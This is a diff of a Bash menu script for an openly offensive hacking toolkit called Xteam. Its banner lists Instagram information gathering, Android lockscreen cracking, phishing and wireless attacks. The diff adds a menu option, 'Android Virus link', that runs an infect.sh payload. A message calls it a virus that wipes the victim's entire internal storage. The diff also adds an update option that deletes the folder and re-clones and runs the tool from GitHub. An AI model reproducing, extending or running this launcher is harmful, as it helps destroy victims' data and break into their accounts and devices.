@@ -21,7 +21,7 @@ echo -e "$Green Created By \e[1;34m"
 sleep 2.0
 
     echo " "
-    echo -e "$Red                               ⫸ Coded by$Yellow xploits.tech$Red ⫷\033[0m"
+    echo -e "$Red                               ⫸ Coded by$Yellow xploitstech$Red ⫷\033[0m"
     echo -e "$Red                               ⫸$Purple X Hackers$Red ⫷\033[0m"
 echo " "
 echo -e " $Red       ||----------------------------$Cyan [features] $Blue ---------------------------||"
@@ -30,8 +30,8 @@ echo -e " $Red       ||             $Purple%=>$Yellow[1️⃣] Insta information
 echo -e " $Red       ||             $Purple%=>️$Yellow[2️⃣] Crack android lockscreen interfaces$Blue             ||"
 echo -e " $Red       ||             $Purple%=>$Yellow[3️⃣] Phishing hacks$Blue                                  ||"
 echo -e " $Red       ||             $Purple%=>$Yellow[4️⃣] Wireless Attacks$Blue                                ||"
-echo -e " $Red       ||             $Purple%=>$Yellow[5️⃣] Update Xteam$Blue                                    ||"
-echo -e " $Red       ||             $Purple%=>$Yellow[6️⃣] Remove Xteam$Blue                                    ||"
+echo -e " $Red       ||             $Purple%=>$Yellow[5️⃣] Android Virus link$Blue                                    ||"
+echo -e " $Red       ||             $Purple%=>$Yellow[6️⃣] Update Xteam$Blue                                    ||"
 echo -e " $Red       ||             $Purple%=>$Yellow[7️⃣] About Cynone.com$Blue                                           ||"
 echo -e " $Red       ||             $Purple%=>$Yellow[8️⃣] exit$Blue                                            ||"
 echo -e " $Red       ||                                                                    ||"                                                                                       
@@ -70,17 +70,21 @@ echo " "
 
         exit
     elif [ $ch -eq 5 ];then
+        cd $HOME
+        cd Xteam
+        cd infect
+        echo -e "\e[1;34m  This Virus Formates (Deletes) the victims Full Internal Storage So think and Use."
+        bash infect.sh
+        
+     
+        exit
+   elif [ $ch -eq 6 ];then 
         echo -e "\e[1;34m Downloading Latest Files..."
         cd $HOME
         rm -rf Xteam
         git clone https://github.com/xploitstech/Xteam
         cd Xteam
-        bash Xteam.sh
-     
-        exit
-   elif [ $ch -eq 6 ];then 
-        cd $HOME
-        rm -rf Xteam
+        bash Xteam.sh   
         
         exit
    elif [ $ch -eq 7 ];then
